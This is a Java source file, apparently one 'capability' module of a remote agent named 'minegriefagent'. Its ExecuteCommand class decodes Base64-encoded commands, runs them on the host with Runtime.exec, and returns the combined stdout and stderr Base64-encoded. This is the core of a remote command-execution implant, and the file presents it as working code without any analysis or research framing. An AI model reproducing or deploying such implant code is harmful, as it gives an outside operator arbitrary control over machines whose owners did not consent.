package com.chebuya.minegriefagent.capabilities;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import static com.chebuya.minegriefagent.util.Logging.LOGGER;

public class ExecuteCommand {
    public static String executeCommand(String command) throws RuntimeException {
        Process process = null;
        BufferedReader stdoutReader = null;
        BufferedReader stderrReader = null;
        try {
            String decodedCommand = new String(Base64.getDecoder().decode(command), StandardCharsets.UTF_8);
            LOGGER.info("executing " + decodedCommand);
            process = Runtime.getRuntime().exec(decodedCommand.split("\\s+"));

            StringBuilder output = new StringBuilder();

            stdoutReader = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
            String line;
            while ((line = stdoutReader.readLine()) != null) {
                output.append(line).append(System.getProperty("line.separator"));
            }

            stderrReader = new BufferedReader(new InputStreamReader(process.getErrorStream(), "UTF-8"));
            while ((line = stderrReader.readLine()) != null) {
                output.append(line).append(System.getProperty("line.separator"));
            }

            process.waitFor();

            return Base64.getEncoder().encodeToString(output.toString().getBytes());
        } catch (Exception e) {
            LOGGER.warning("failed to execute command: " + e.getMessage());
            throw new RuntimeException("Failed to execute command: " + command, e);
        } finally {
            if (stdoutReader != null) {
                try {
                    stdoutReader.close();
                } catch (IOException e) {
                    LOGGER.warning("could not close the stdout reader: " + e.getMessage());
                }
            }
            if (stderrReader != null) {
                try {
                    stderrReader.close();
                } catch (IOException e) {
                    LOGGER.warning("could not close the stderr reader: " + e.getMessage());
                }
            }
            if (process != null) {
                process.destroy();
            }
        }
    }
}
